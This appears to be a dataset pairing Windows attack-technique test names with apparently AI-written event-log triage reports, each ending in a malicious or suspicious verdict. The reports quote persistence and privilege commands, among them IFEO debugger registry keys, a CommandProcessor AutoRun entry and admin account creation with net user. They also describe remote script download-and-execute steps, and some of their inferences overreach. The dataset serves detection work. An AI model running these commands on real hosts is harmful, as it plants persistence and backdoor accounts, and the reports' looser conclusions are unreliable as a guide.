COM Hijacking with RunDLL32 (Local Server Switch),"**Analysis of Windows Event Logs:**

1. **PowerShell Usage:**
   - The logs show instances of PowerShell being executed. The command involves creating registry keys and loading a DLL (`data.015_calc.dll`) through a registry entry and subsequent execution via `rundll32.exe`. This behavior is highly suspicious and typically associated with attempts to establish persistence or execute unauthorized code.

2. **Process Execution:**
   - There are multiple executions of standard Windows utilities like `powershell.exe`, `whoami.exe`, `conhost.exe`, and `rundll32.exe`. The usage of `rundll32.exe` with a command to run a local server using a GUID is particularly noteworthy and not typical in standard operations without a legitimate reason.
   - The specified command-line for PowerShell actions indicates potential manipulation intended to look benign or achieve specific malicious objectives, possibly suggesting an attempt to masquerade activity.

3. **Associated Registry Modifications:**
   - The creation of registry keys under `HKCU` and the specified path is suspicious. It suggests that the scripts or commands could be attempting to configure the system for malicious purposes or create a method of persistence.

4. **Edge Update Processes:**
   - Multiple EdgeUpdate processes are logged. While frequent updates of system browsers or software are not unusual, the overlap with the timing of other anomalous activities linked to the same user accounts warrants caution.
   - The Edge update activity appears to be legitimate based on file paths, command lines, and logged user as `NT AUTHORITY\SYSTEM`, aligning with expected behavior for system updates.

5. **Security Considerations:**
   - The high integrity level of the processes being manipulated (via PowerShell and rundll32.exe) means there is a risk of significant system changes or unauthorized access escalation.
   - Consistent use of the administrator account (SERVER002\admin_test) suggests potential misuse or compromise of this administrator-level account, highlighting a significant risk for security settings and system control.

**Assessment and Resolution:**

- **Indicators of Malicious Activity**: The logs present a clear indicator of a potentially malicious activity manifesting through PowerShell commands aimed at modifying registry settings and executing code from a DLL file.
- **Risk & Threats**: High given the registry key manipulation and execution of scripts using PowerShell.
- **Guidance on Proceeding**:
  - Immediate isolation of the machine `Server002` is recommended to prevent any further unauthorized changes or data exfiltration.
  - Conduct a thorough forensic analysis to identify and remediate potential changes or malicious artifacts on the system, especially around user `admin_test`.
  - Review and possibly reset the credentials of any accounts that may have been compromised.
  - Enhance monitoring and deploy effective endpoint protection measures to detect and mitigate such threats in the future.

**Resolution**: **MALICIOUS** - The logs demonstrate activity characteristic of a compromise, likely linked to unauthorized persistence mechanisms and code execution via PowerShell scripts."
IFEO Global Flags,"Upon analyzing the provided logs, several activities can be observed and assessed for suspicious behavior:

### System Log:
- Most of the entries pertain to time updates, synchronized via `time.windows.com`, and the use of `svchost.exe`. This generally represents normal behavior for time synchronization and does not raise immediate concerns.

### Security Log:
- The `EventID: 4616` events are related to local time being changed. Again, these are related to system operations and don't inherently exhibit any suspicious activity.

### Application Log:
- The logs simply show the stopping of services and are typical operations. The entry from `Software Protection Platform Service` reflects internal system tasks but doesn't suggest malicious activity.

### Sysmon Log:
- Execution of `wevtutil.exe` and `conhost.exe` by `admin_test` doesn't raise red flags by itself as these utilities are frequently used for legitimate purposes, but in context, consistent usage should be explained by proper administrative tasks.
- **The command sequence executed by `cmd.exe`**: The command involving `REG ADD` to modify notepad.exe’s registry suggests process tracking or manipulation. Specifically:
  - It modifies registry settings related to `Image File Execution Options`, which are often used in software breakpoints or debugging. The involvement of `SilentProcessExit` with a `Monitoring Process` could suggest an attempt to obfuscate or monitor process exits stealthily.
  - The nature of these modifications suggests potential persistence mechanisms or tampering with process execution behavior, which are common techniques in malware infections.
  
### Detailed Analysis & Conclusion:
1. **Suspicious Behaviors**:
   - The use of `REG ADD` commands to configure `Image File Execution Options` and `SilentProcessExit` for `notepad.exe` points to possible malicious intent. Such modifications can potentially alter the behavior of applications in a stealthy manner.

2. **Potential Threat**:
   - This registry manipulation is indicative of advanced persistence techniques or preparation for unauthorized monitoring and could represent part of a larger intrusion set aiming to remain undetected on the system.

3. **Assessment**:
   - Given the registry changes and absence of explicit legitimate context for such actions in these logs, this activity is classified as **SUSPICIOUS**. It warrants further investigation, particularly focusing on why these changes were made and verifying their legitimacy.

### Recommended Actions:
- Examine the rationale or tasks executed by `SERVER002\admin_test` to determine if such modifications were authorized.
- Assess if these registry changes align with any recent administrative tasks or software requirements.
- If unauthorized, consider implementing system integrity checks and ensuring that system monitoring is set to alert on similar registry and process execution changes.
- Investigate further into any other indicators across the network environment to ensure no broader compromise has taken place."
Bits download using desktopimgdownldr.exe (cmd),"### Detailed Analysis

After analyzing the provided Windows event logs from the Sysmon, System, and Application channels, the following observations and assessments have been made:

1. **Sysmon Logs Observations**:
   - **Process Creation and Execution**: Multiple instances of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and other processes like `hostname.exe` and `desktopimgdownldr.exe` are observed running under the user `SERVER002\admin_test`. Out of these, the execution of `cmd.exe` with suspicious command lines, particularly involving the command `desktopimgdownldr.exe` accessing external URLs for downloads, is concerning. Specifically, the URLs like `https://raw.githubusercontent.com/file/file-file/master/files/data/data.md` suggest potential unauthorized network activity that may constitute part of a malicious script or automated attack.
   
   - **Privilege and Integrity Level**: The processes are executed with a high integrity level under administrative privileges, indicating potential risks if exploited for malicious activities.

2. **Edge Update Activity**:
   - A significant amount of activity from `MicrosoftEdgeUpdate.exe` processes has been logged. These appear generally consistent with normal update activities conducted by Microsoft Edge. The executables and their associated processes show legitimate file versions, command line execution paths, and company information without any direct indicators of malicious tampering.

3. **System and Application Logs**:
   - **System Log**: Features a benign Network Time Protocol (NTP) synchronization with `time.windows.com` which is standard behavior for time-keeping purposes in Windows environments.

   - **Application Log**: Indicates services related to Edge updates were stopped. This aligns with the observed Sysmon logs, suggesting maintenance or normal system update activity.

### Assessment:
- **Potentially Suspicious Activity**:
  - **Desktop Image Downloader Command**: The usage of `cmd.exe` to run `desktopimgdownldr.exe` with an external URL is anomalous and requires further investigation to ensure that it wasn't a part of any malicious exploitation. Unauthorized external connectivity can be a vector for malware downloads, potentially representing a compromise if done without user consent.
  
- **Benign Activity**:
  - **Edge Update Processes**: The repeated execution of `MicrosoftEdgeUpdate.exe` and related processes appears aligned with typical update operations for Edge. The logs do not exhibit any direct indicators of malicious conduct beyond normal update procedures.

### Resolution:
**SUSPICIOUS**

While the majority of the activities (e.g., Edge Update processes, time synchronization) are benign, the use of `cmd.exe` to invoke `desktopimgdownldr.exe` with an external URL is suspicious and requires further investigation to rule out any malicious intent. Follow-up actions should include:

- **Review the user account (`SERVER002\admin_test`) activities** to ensure all actions were authorized and expected.
- **Analyze network traffic and firewall logs** for external communication initiated by `desktopimgdownldr.exe` to see if there were unauthorized data transfers.
- **Check the file integrity and sources** of `desktopimgdownldr.exe` to ensure its legitimacy and that it hasn't been tampered with.
- **Correlate with other security tools** to detect any anomalous patterns that coincide with this activity timeline.

By conducting these follow-ups, you can determine if any remediation actions are necessary to prevent potential security threats."
Set Arbitrary Binary as Screensaver,"### Detailed Analysis of the Logs:

#### Application Log:
- **EventID 16384**: The provided `Microsoft-Windows-Security-SPP` log entry details an event related to the Software Protection Platform Service. This log entry alone does not indicate any malicious activity and appears to be a routine system event.

#### Sysmon Logs:
- **Microsoft Edge Update Process Activity (Multiple Occurrences)**:
  - There are several entries related to `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. These files are legitimate components of the Microsoft Edge update mechanism running under `NT AUTHORITY\SYSTEM` with a high integrity level. This behavior seems consistent with normal software update operations.
  
- **Whoami and Conhost Executions**:
  - The execution of `whoami.exe` and `conhost.exe` by the user `SERVER002\admin_test` does not inherently indicate malicious behavior and is common for administrative tasks or user inquiries.

- **Command Execution Through cmd.exe**:
  - A significant point of concern is the command execution event seen on process `cmd.exe` (EventRecordID 17999). The command-line instructions include exporting registry settings, copying `cmd.exe` as a screensaver, and modifying screensaver settings to point to a potentially malicious file `evilscreensaver.scr`. This sequence of registry modifications is highly suspicious and indicative of unauthorized modifications potentially aimed at persistence or malicious execution.

- **Registry Modifications with reg.exe**:
  - Subsequent executions of `reg.exe` show further registry modifications related to screensaver settings. This activity aligns with the suspicious behavior identified in the cmd.exe command.

#### Security Logs:
- **Admin Session Activity**:
  - The `admin_test` account is being used, with a logon event (Event ID 4624) corresponding with the observed sequence of actions. Importantly, Event ID 4672 indicates that this account was granted powerful privileges typically reserved for system-level tasks (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This could be exploited in malicious scenarios, especially given the context of the altered screensaver settings.

### Assessment:
The logs collectively indicate a serious security concern:

- The presence of a command sequence involving `cmd.exe` aimed at registry modifications suggests potential malicious intent to modify system screensaver settings to execute unauthorized scripts or binaries under the guise of a screensaver.
- Given the powers attributed to the `admin_test` user, there is an elevated risk of privilege abuse.
- The registry changes are especially dubious as they point to a crafted executable for the screensaver setting, which typically shouldn't be altered under normal operations.

### Conclusion:
**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions**:
   - Isolate the affected system (Server002) from the network to prevent further malicious activity.
   - Conduct a full anti-malware scan on Server002.
   - Roll back the registry changes made by the suspicious command sequence, and restore screensaver settings to their defaults.

2. **Investigation and Forensics**:
   - Conduct a full forensic analysis on Server002 to trace the origin and scope of the suspicious activities.
   - Collect and preserve volatile data and logs for further investigation.
   - Review any anomalous authentication logs for the `admin_test` account and others to determine if the account has been compromised.

3. **Prevention**:
   - Examine and tighten user account privileges, especially for accounts performing administrative tasks.
   - Educate users on safe practices, especially relating to the alteration of system settings and usage of administrative accounts."
Persistence using automatic execution of custom DLL during RDP session,"Upon reviewing the provided Windows event logs, several points of interest that could potentially indicate suspicious or malicious activity have been identified. Here's a detailed analysis:

1. **Security Log Analysis**:
   - **EventID 4624**: Indicates successful logons. The logons are from the user `admin_test` using NTLM authentication from the workstation `DESKTOP-3HL5B2P`. The logon type `3` indicates a network logon, which is expected for a remote scenario. Although NTLM is an older authentication protocol and can be prone to certain attacks, its usage is common in various environments.
   - **EventID 4672**: This event indicates that the `admin_test` account is acquiring special privileges such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, etc. The assignment of these privileges can be normal for an administrative account but can also be leveraged for privilege escalation.
   - **EventID 4634**: Logs indicate a logoff for the user `admin_test`. This in itself is a normal operation following login events.

2. **Sysmon Log Analysis**:
   - The repeated execution of processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and notably `cmd.exe` with specific command-line arguments raises concern. The `cmd.exe` process executes a command to modify registry entries, which can be indicative of potentially malicious activity if done without authorization:
     - The command executed is `reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"" /v Path /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f`. This action is a direct registry modification by `cmd.exe` and could be used to manipulate system behavior or load a potentially malicious DLL (AMSI is typically used for anti-malware inspection).
   - The process executions are carried out with high integrity, indicating they have administrative privileges.

3. **System and Application Logs**:
   - There is nothing immediately suspicious within the system logs. Time changes and updates from `time.windows.com` are usual.
   - Application log contains a security platform event with no suspicious information.

### Conclusion and Recommendation:

Based on the analysis:

- The logs contain unusual registry modifications through `cmd.exe` with administrative privileges. Such actions could suggest an attempt to manipulate system behavior or deploy malicious software. 
- I'm marking this activity as `SUSPICIOUS` due to its potential use in post-exploitation activities.

**Next Steps**:
- Conduct a deeper investigation to ascertain the nature and intent of the registry modifications and examine if the `admin_test` account's activity had been within normal operational parameters.
- Consider monitoring for repeated patterns or attempts to use similar techniques.
- Review the user's access rights and ensure they align with their role to prevent misuse of privileges.
- If confirmed malicious, further investigate for compromised accounts or malware presence and take remediation actions, including password resets and system scans."
Create a new Windows admin user via .NET,"Upon reviewing the logs from the Windows host, there are clear indicators of malicious activity, specifically within the Windows PowerShell log and supported by the security and Sysmon logs:

1. **Suspicious PowerShell Activity**:
    - The PowerShell logs reveal the execution of a command leveraging `powershell.exe` to download and execute a script from `https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1`. This script appears to create a new local administrator user, which is a typical behavior of a privilege escalation attack aiming to maintain persistence on the system.

2. **Security Event Logs Pertaining to User Creation and Modification**:
    - The security logs indicate the creation of a new local user (`NewLocalUser`) and membership modification involving administrator privileges. The `admin_test` account, which executed these actions, appears to be involved in unauthorized activity.

3. **Execution of Windows Processes**:
    - The Sysmon logs contain entries highlighting processes that corroborate the actions taken by the PowerShell script, including network connections and process executions associated with admin task and user management tools, such as `net.exe` and `net1.exe`.

4. **Abuse of Elevated Privileges**:
    - The security logs show several privilege escalation activities through event IDs like `4672`, involving privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, aligning with activities that would occur when malicious software attempts to gain significant control over a system.

Based on these logs, there is strong evidence of malicious behavior targeting this Windows host. Unauthorized scripts executed via PowerShell, the addition and modification of user accounts, and the granting of elevated privileges without legitimate tasks to support these actions indicate a compromise.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected host from the network to prevent further propagation of any potentially malicious activities.
- Carry out a thorough investigation and incident response, including forensic analysis of the host to determine the full scope of the compromise.
- Reset all potentially compromised accounts and enforce strong password policies.
- Scan the network for other potentially affected systems.
- Educate users and administrators to recognize and report suspicious activity, such as unexpected PowerShell executions or unauthorized account changes.
- Consider implementing additional security measures such as endpoint detection and response (EDR) tools to improve future detection and response capabilities."
Create a new Windows admin user,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

1. **Creation and Privilege Escalation of User Account:**
   - **Sysmon Event (EventID 1 & 5):** Observation of the command `""cmd.exe"" /c net user /add ""data.001_Admin"" ""data_pass"" & net localgroup administrators ""data.001_Admin"" /add` executed by `admin_test`. This command is indicative of a user account (`data.001_Admin`) being added and then elevated to the administrator group. This is highly suspicious and often associated with unauthorized privilege escalation activities.
   - **Security Events (4720, 4728, 4732):** Further logs confirm the creation and addition of the user `data.001_Admin` to the Administrators group.

2. **Use of `wevtutil.exe`:**
   - **Sysmon Logs (EventID 5):** Multiple instances of `wevtutil.exe` executed by `admin_test` are observed, which might indicate tampering with event logs. While `wevtutil.exe` is a legitimate tool for managing event logs, its misuse could mean clearing or modifying logs to hide malicious activities.

3. **Use of `hostname.exe` and `whoami.exe`:**
   - These are legitimate utilities used to gather hostname and current logged-in user information respectively. They are often used as part of reconnaissance activities within a compromised system, though by themselves they are not inherently malicious.

4. **Command Execution through `cmd.exe`:**
   - The use of command-line operations to add a user and elevate privileges constitutes a serious security incident if unauthorized.

#### Malicious Indicators:

- The sequence of activities involving the creation of a new user account and its addition to the administrators' group strongly indicates malicious activity, especially since it was done via command-line inputs which bypass typical user interfaces and monitoring solutions.
- The synchronized timing and continuous nature of command executions within a short timeframe are suspicious and typical of scripted attacks.

#### Threats or Risks Identified:

- Unauthorized privilege escalation and potential backdoor creation with the user `data.001_Admin` which could be exploited for persistent access.
- Potential log manipulation or clearing through `wevtutil.exe` usage.
- The activity executed under the `admin_test` user, if unauthorized, indicates a compromised account or insider misuse.

#### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Disable the `data.001_Admin` account and remove it from any elevated groups.
   - Conduct a thorough review of the `admin_test` user's recent activities and verify whether this activity was intended and authorized.
   - If unauthorized, reset credentials, and review access permissions and group memberships for all critical accounts.

2. **Further Investigation:**
   - Analyze the timeline of the account creation and correlate with network logs, firewall, and access logs to identify any external connections or anomalies.
   - Investigate if there are any further traces of malicious scripts or additional unauthorized users.
   - Conduct a wide-scale threat hunt to identify any other signs of compromise.

3. **Preventive Measures:**
   - Implement stricter access controls and multi-factor authentication (MFA) on privileged accounts.
   - Enhance monitoring and anomaly detection capabilities focusing on command-line activities and account attribute changes.
   - Review and restrict the use of tools like `wevtutil.exe` unless absolutely necessary and ensure logs are forwarded to a secure logging server.

### Resolution: MALICIOUS
The activity identified in the logs shows clear signs of malicious activity, specifically unauthorized creation of a privileged user account and potential log tampering. Immediate action should be taken to contain and investigate the breach."
Create a new Domain Account using PowerShell,"### Detailed Analysis:

1. **Sysmon Logs**:
   - There's extensive logging of process creation and termination events involving standard Windows utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `MusNotification.exe`. These services are typical components of Windows operations and are not immediately suspicious by themselves.
   
   - A repeated pattern observed is several instances of `conhost.exe` and `wevtutil.exe` starting frequently, which could suggest script automation or automated task sequences. However, without further information regarding context, this may simply be normal operational behavior.

   - A crucial detail is the execution of a PowerShell script seen in the logs. The command relates to account management tasks scripting actions such as setting passwords and enabling user accounts. This action is potentially concerning, as it indicates an automated attempt to manage user accounts, possibly without administrator oversight.

2. **System Logs**:
   - Routine operations are logged here, including a security intelligence update and timezone adjustments through the kernel. These entries appear standard for a Windows operating system.

3. **Security Logs**:
   - There are time synchronization events logged from the service `svchost.exe`, which in itself is a legitimate system operation. However, frequent time changes can be indicative of an attempt to manipulate system logs or circumvent log timing alerts, warranting a closer look into the need and context of these alterations.

4. **Windows PowerShell Logs**:
   - The most significant entries are the PowerShell events, clearly reflecting execution of a script containing credentials and user account manipulation commands. The script attempts to create a user, assign a password, enable the account, and save it, which could facilitate unauthorized access or privilege escalation.

5. **Application Logs**:
   - These logs primarily relate to Microsoft software protection, displaying normal operations without any immediate indication of compromise.

### Assessment:

- The operations involving `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and standard update events are fairly typical for a Windows environment, suggesting these actions are **BENIGN**.
- The repeated attempts to execute a PowerShell script aimed at user account manipulation are highly **SUSPICIOUS** and require further investigation. Although aspects of it could reflect intended administrative tasks in controlled environments, the absence of explicit confirmation from IT authorization signifies potential malicious intent.
- The series of timestamp adjustments is another area flagged as **SUSPICIOUS**, as this could support efforts to cover tracks by altering log entries' timestamps.

### Resolution:

The logs should be marked as **SUSPICIOUS** and require immediate attention to verify if the script was an authorized administrative action and if the time changes were legitimately needed. Network and system policies should be reviewed to prevent unauthorized access or user account creation without proper oversight. Consider implementing additional monitoring and perhaps restricting the execution of unverified scripts to prevent potential exploitation."
Install Additional Authentication Packages,"Upon analysis of the provided Windows event logs, several activities appear to be of significant concern, hinting towards potential malicious actions. Here's a detailed assessment:

1. **Security Logs**:
   - The security logs focus mainly on the time changes executed by `svchost.exe`. This is typically less suspicious in itself as it might relate to system time synchronization. However, the repeated updates within short intervals (EventIDs 30351 and 30352) should be corroborated with other logs for potential anomalies in system time adjustment that might indicate tampering but this alone isn't very indicative of a compromise.

2. **Sysmon Logs**:
   - **PowerShell Execution**: There's a series of commands that involve PowerShell scripts, notably the execution with a complex script which modifies the registry concerning the Lsa (Local Security Authority). This is particularly suspicious:
     - The command includes operations like `reg.exe export` and copying potentially suspicious DLLs to system directories which could indicate an attempt to load unauthorised drivers or malware.
     - The process `filePWFilter.dll` is being copied and could be a malicious activity to introduce a rogue DLL into the system.
     - The alteration of the ""Authentication Packages"" registry key is a classic example of a Privilege Escalation technique or an attempt to create backdoors for persistent access.

3. **Application and PowerShell Logs**:
   - Consistent with the issue identified in sysmon logs, PowerShell logs show the execution of potentially malicious scripts that alter system settings which is suspicious.
   - The use of `PowerShell` in this context is particularly worrying given the lack of details typically logged by default settings.

4. **System Logs**:
   - Not much anomalous in system logs apart from the timestamp adjustments noted.

**Resolution**:
- **MALICIOUS**: The activities logged indicate potentially malicious actions. The combination of PowerShell execution to alter critical system settings and registry keys plus unauthorized modifications to security-related registries strongly suggests an attempt to compromise the system’s integrity.
  
**Guidance**:
1. **Immediate Review**: Investigate administrative logs for any unscheduled login activities or the presence of unauthorized accounts or activities around the timestamps in suspicion.
2. **Restore and Clean**: Consider isolating the system, restoring it to a clean state, followed by a thorough malware scan to ensure that no rogue files have been introduced or persisted on the system.
3. **Audit Changes**: Review other systems for similar anomalies, suggest policies enforcing enhanced logging and monitoring, particularly for the PSA security aspects.
4. **Strengthen Policies**: Tighten security policies around PowerShell use and scripting, ensuring stricter execution policies and employing tools like AppLocker to prevent unauthorized script execution."
Azure AD - Create a new user via Azure CLI,"Upon analyzing the provided Windows event logs, I've identified several entries that warrant a detailed examination for potential malicious activity.

### System Logs:
- **Time Service Events:** The logs show multiple time change events initiated by the `svchost.exe` process. Such changes can signify alterations to system time which are generally benign and related to time synchronization. However, frequency or intent to manipulate logs should be scrutinized.

### Application Logs:
- **Software Protection Platform Service:** No anomalies detected here. Regular operation of the Software Protection Platform Service updating rules.

### Security Logs:
- **Privilege Use Events:** Logs show legitimate adjustments to system time by a service account. These actions aligned with the modifications in system logs suggest standard time sync operations and not a high privilege user tampering with logs.

### PowerShell Logs:
- **PowerShell Activity:** The logs contain evidence of PowerShell being executed with commands related to Azure login and manipulation of Azure Active Directory user accounts. This activity is potentially suspicious. The creation of a user with seemingly hardcoded credentials and listing users suggest a potential attack or misuse scenario.

### Sysmon Logs:
- **Process Execution:** Multiple entries show processes owned by `SERVER002\admin_test` executing `wevtutil.exe`. The use of `wevtutil` to export Event Logs can be leveraged in intrusion scenarios for evidence removal or gathering intelligence. The presence of these activities alongside PowerShell commands is concerning.
- **PowerShell Execution:** Execution of `powershell.exe` linked with script-based activity (user creation and listing), indicating potentially malicious or unauthorized administrative actions.
- **Unusual Command-Line Activity:** We observe process creations involving `whoami.exe`, `hostname.exe`, and other command executions. While not inherently malicious, in conjunction with other suspicious activities it could signify reconnaissance.

### Assessment:
The logs exhibit several indicators of suspicious activity, especially around PowerShell use and log manipulation tricks. The PowerShell script's involvement in creating Azure AD users with specific credentials is a significant red flag. Similarly, the usage of `wevtutil.exe` for exporting logs could imply efforts for maintaining persistence or covering tracks.

### Resolution:
**SUSPICIOUS** - The logs contain activity that doesn't look right and warrants further investigation. The combination of Azure user manipulation and log exports could indicate unauthorized administrative access or a compromised account scenario.

### Guidance to Proceed:
1. **Immediate Investigation and Response:**
   - Investigate `SERVER002\admin_test` user activities for unusual behavior over a more extended period.
   - Validate all recent administrative actions, changes in Azure AD, and if all user activities are authorized.
   - Check network logs, firewall logs, and any other telemetry data to trace possible unauthorized access points or exfiltrations.
   
2. **Containment:**
   - Temporarily suspend or closely monitor the use of `ADMIN_~1` and possibly affected credentials.
   - Ensure multi-factor authentication (MFA) is enabled and enforced for Azure and administrative access.

3. **Remediation:**
   - Perform a thorough security assessment and scan for any additional indicators of compromise (IoCs) across the infrastructure.
   - Review and potentially reconfigure logging and monitoring to detect similar activities more easily in the future.

4. **Follow-up:**
   - Conduct a security review to audit and refine access controls, especially for privileged accounts and external services like Azure.
   - Implement additional scrutiny for PowerShell scripts execution and logs handling across servers.

A comprehensive evaluation and response are necessary to confirm and address any potential compromise or vulnerabilities in the current setup."
Modify Terminal Services DLL Path,"Upon reviewing the provided Windows event logs, several events indicate suspicious and potentially malicious activities:

1. **Modification of Security Descriptors**:
   - Event ID 4907 from the Security log indicates a change in the security descriptor of the `termsrv.dll` file in `C:\Windows\System32\`. It shows the old security descriptor being replaced with a potentially malicious new one. This action was performed using `powershell.exe`, which is a legitimate tool but can be used for illicit purposes.

2. **Suspicious PowerShell Activity**:
   - Multiple logs in the Sysmon and Windows PowerShell logs show PowerShell being used with a specific and potentially dangerous command sequence. The PowerShell command line run by the `admin_test` user suggests administrative changes to the `termsrv.dll` file and the `ServiceDll` registry value:
     - The command mentions adding a FileSystemAccessRule to grant Full Control to the Administrators group on the `termsrv.dll` file.
     - It attempts to copy the `termsrv.dll` to another location and then modify the `ServiceDll` registry value associated with the Terminal Services.

3. **Registry Modification**:
   - The attempt to modify the `ServiceDll` value in the registry for the TermService service parameters is indicative of potential system modification to alter remote desktop behavior or other service configurations.

4. **High Integrity Level Execution**:
   - Several instances of high-integrity level processes are initiated by `admin_test`. High integrity level often suggests that the operations being performed require administrative privileges, which is consistent with privilege escalation attempts or system compromise.

5. **Resulting Risk and Indicators of Compromise**:
   - The use of PowerShell to manipulate system DLLs and registry settings without clear legitimate business context is a known tactic used in various attack scenarios, including privilege escalation and persistence mechanisms.
   - The behavior of granting full control and replacing DLLs suggests an attempt to bypass security controls.

### Conclusion
Based on the analysis, the logs contain confirmed malicious activity due to the unauthorized modification of system files and registry settings using administrative privileges. 

### Resolution: MALICIOUS
- Recommend conducting an immediate and thorough incident response investigation.
- Remediate any identified unauthorized changes.
- Consider isolating the affected host to prevent further compromise.
- Review user activity and credentials, especially for `admin_test`, to ensure user accounts have not been compromised.
- Implement monitoring and alerting for similar PowerShell and file modification activities across the network."
IFEO Add Debugger,"Upon analyzing the provided Windows event logs, several activities stand out that require further investigation. Below is a detailed analysis:

1. **Sysmon Logs:**
   - Multiple executions of the `cmd.exe` and `reg.exe` processes were observed with command lines indicating the alteration of registry entries related to `Image File Execution Options`. The command:
     ```
     cmd.exe /c REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe"" /v Debugger /d ""C:\Windows\System32\cmd.exe""
     ```
     suggests a technique for creating a debugger key for `calc.exe`, diverting its execution to `cmd.exe` when executed. This is a known persistence or privilege escalation tactic.
   
   - Several executions of `whoami.exe` and `hostname.exe` by the `admin_test` user at high integrity level also raise questions about potential command line reconnaissance.

2. **Application Log:**
   - The logs show multiple start and stop events for the `edgeupdate` service. While `edgeupdate` is a legitimate updater for Microsoft Edge, the frequent and independent logs could point towards potential misuse or testing by a malicious entity to mask their activities.

3. **Behavior Analysis:**
   - The frequent and rapid sequence of events involving system utilities (`hostname.exe`, `whoami.exe`) and the registry modification (via `reg.exe`) are indicative of potential reconnaissance and setup activity by an actor preparing for malicious operations.
   
4. **System Log:**
   - Time change logs might suggest synchronization issues; however, paired with registry changes, it can indicate attempts to manipulate time-based access or audit records.

5. **Security Log:**
   - Kernel and security audit logs record time changes consistently around the same periods as when `edgeupdate` services are toggled, further heightening the suspicion of coordinated, unauthorized administrative activities.

**Assessment:**

- **Suspicious Indicators:**
  - The registry modifications indicating persistence techniques.
  - The use of system utilities (`whoami`, `hostname`) in potential reconnaissance or preparation.
  - The absence of legitimate purposes tied to these actions in context to the provided logs.

Given the elevated permissions and potential compromise attempts indicated by registry modifications and process executions, this activity is better categorized as something beyond benign. The frequent use of `wevtutil.exe` could also suggest attempts to manipulate event logs, though it requires confirmation.

**Conclusion:**
After considering the patterns and type of activities observed in the logs, the resolution is:

- **MALICIOUS**

**Guidance:**
- Immediate further investigation: Confirm the legitimacy of the `admin_test` activities and verify the necessity of the `Image File Execution Options` registry entries.
- Review additional logs or endpoint protection records for corroborating evidence of unauthorized access.
- Isolate the system if ongoing malicious activities are confirmed to prevent further exploitation or data exfiltration.
- Deploy strict audit policies and monitor for similar behavioral patterns on the network."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"Upon analyzing the Windows event logs provided, several activities stand out as potentially suspicious and indicative of malicious behavior:

1. **PowerShell Activity:**
   - A PowerShell command is observed in the logs, modifying an AutoRun registry entry to execute `notepad.exe` every time the command prompt is opened. The command used is as follows:
     ```
     ""powershell.exe"" & {$path = ""HKCU:\Software\Microsoft\Command Processor\"", if (!(Test-Path -path $path)){ New-Item -ItemType Key -Path $path }, New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""}
     ```
   - This modification of the AutoRun value using PowerShell could be an attempt at persistence on the system. It acts to execute a program (in this case, `notepad.exe`) automatically whenever a command shell is opened, which is a common tactic for maintaining access on a compromised system.

2. **Excessive Wevtutil Usage:**
   - There are multiple logs indicating the execution of `wevtutil.exe`, a command-line utility used for managing Windows Event logs.
   - The frequent appearance of `wevtutil.exe` could indicate an attempt to clear or manipulate event logs to cover tracks, a known method used by attackers after gaining access to a system.

3. **Usage of Whoami and Hostname:**
   - The repeated use of `whoami.exe` and `hostname.exe` could suggest an attacker is verifying the user context and system identity. While these actions alone are not inherently malicious, they often appear in the early stages of an attacker's reconnaissance process on a system.

4. **Privilege Escalation Indicators:**
   - The account `SERVER002\admin_test` performed tasks with elevated privileges, and `SeDebugPrivilege` was among the privileges listed. The presence of such privileges can be suspicious if activity deviates from normal administrative operations, potentially allowing an attacker to escape process barriers.

5. **Time Sync Anomalies:**
   - The logs indicate time synchronization events (`EventID 4616`), which might be regular system activity. However, attackers sometimes alter system time to evade detection or alter timestamps of log entries.

**Assessment:**
- The specific PowerShell activity with an AutoRun registry modification and the unusual use of `wevtutil.exe` are particularly concerning. They align with known techniques for establishing persistence and covering tracks, respectively.

**Resolution:**
- **MALICIOUS**: The combination of PowerShell script modifying registry values and frequent `wevtutil` usage suggests an active attempt to compromise and manipulate the system for persistence or defense evasion. These activities typically indicate malicious intent and should be treated as high-risk.

**Guidance on How to Proceed:**
- **Immediate Steps:**
  - Isolate the affected system (Server002) from the network to prevent potential lateral movement or data exfiltration.
  - Perform a robust analysis to identify any additional indicators of compromise.
  - Verify and cross-reference the activity with authentication and access logs to check for unauthorized access or changes.
  - Revert any identified malicious modifications, such as registry changes.

- **Long-Term Measures:**
  - Conduct a thorough review of all accounts and privileges on the system, implementing stricter access controls where needed.
  - Enhance monitoring rules to detect similar behavior in the future, including abnormal Powershell executions and unauthorized registry changes.
  - Educate users about these types of attack vectors to improve organizational security awareness."
Create a new user in a command prompt,"Based on the provided logs, I have conducted a thorough analysis of the events that occurred on the specified Windows machine. Here are my detailed findings:

### Indicators of Malicious Activity:

1. **Unusual User Account Creation:**
   - There are several events related to the creation of a new user account with the username `data.001_CMD`:
     - **Sysmon EventID 1:** Indicates the execution of `cmd.exe` with the command-line argument `""cmd.exe"" /c net user /add ""data.001_CMD"" ""data.001_CMD!""`.
     - **Security EventID 4720:** Confirms the creation of the user account `data.001_CMD`.
   - This action is potentially suspicious as it involves the creation of a user account using command-line commands, which is often indicative of unauthorized activity.

2. **Privilege Escalation:**
   - **Security EventID 4672:** Shows the account `admin_test` being granted several high-level privileges such as `SeSecurityPrivilege`, `SeTakeOwnershipPrivilege`, and `SeDebugPrivilege`, etc. This could suggest privilege escalation activities, though more context would be needed to determine the intent.

3. **Potential Reconnaissance Activity:**
   - **Sysmon EventID 1:** Execution of utilities like `hostname.exe` and `whoami.exe` may indicate attempts to gather information about the system and the current user.

